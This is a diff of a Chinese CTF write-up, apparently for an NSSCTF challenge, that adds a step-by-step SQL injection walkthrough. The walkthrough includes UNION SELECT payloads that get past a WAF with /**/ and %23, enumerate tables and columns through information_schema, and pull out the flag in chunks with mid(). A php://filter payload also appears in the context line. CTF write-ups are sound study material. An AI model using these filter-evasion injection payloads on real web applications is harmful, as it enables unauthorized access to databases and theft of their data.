@@ -225,6 +225,56 @@ yjk=jk(800个字符)&flag=php://filter/read=convert.base64-encode/resource=flag.
 ![alt text](image-62.png)
 ![alt text](image-63.png)
 说明是单引号闭合
+然后看一下列数
+![alt text](image-66.png)
+用order by无论怎么都会报错，因为waf防止了order，而且发现1空格被过滤掉了，这里可以用+代替或者/**/
+试一下用group by
+![alt text](image-67.png)
+![alt text](image-68.png)
+group by 3#有用，4#没用说明是三列
+![alt text](image-69.png)
+经过测试发现空格 +和--+都被过滤
+所以用%23来代替--+的注释功能
 
-然后测试行回显数
+然后查看回显列数
+构造payload
+```
+http://node7.anna.nssctf.cn:29355/?wllm=-1'union/**/select/**/1,2,3%23
+```
+![alt text](image-70.png)
+这里说明这三列里2，3列是有数据回显的
+构造payload查看2，3列里的东西
+```
+http://node7.anna.nssctf.cn:29355/?wllm=-1'union/**/select/**/1,database(),database()%23
+```
+![alt text](image-71.png)
+然后构造payload查看test_db里的内容
+```
+http://node7.anna.nssctf.cn:29355/?wllm=-1'union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()%23
+```
+![alt text](image-72.png)
+构造payload查看LITI_flag里的内容
+```
+http://node7.anna.nssctf.cn:29355/?wllm=-1'union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()%23
+```
+![alt text](image-73.png)
 
+构造payload找flag
+```
+http://node7.anna.nssctf.cn:29355/?wllm=-1'union/**/select/**/1,2,group_concat(flag)/**/from/**/test_db.LTLT_flag%23
+```
+![alt text](image-74.png)
+发现只有一半
+看别人的wp说
+发现flag不能显示完全，说明页面显示字符的长度不够， 可以使用截断函数substr right但是被过滤了，使用mid发现未被过滤，用mid函数多次截取，得完整flag
+构造payload
+```
+http://node7.anna.nssctf.cn:29355/?wllm=-1'union/**/select/**/1,2,mid(group_concat(flag),20,20)/**/from/**/test_db.LTLT_flag%23
+```
+![alt text](image-75.png)
+构造payload
+```
+http://node7.anna.nssctf.cn:29355/?wllm=-1'union/**/select/**/1,2,mid(group_concat(flag),40,20)/**/from/**/test_db.LTLT_flag%23
+```
+![alt text](image-76.png)
+拼接起来得到flag
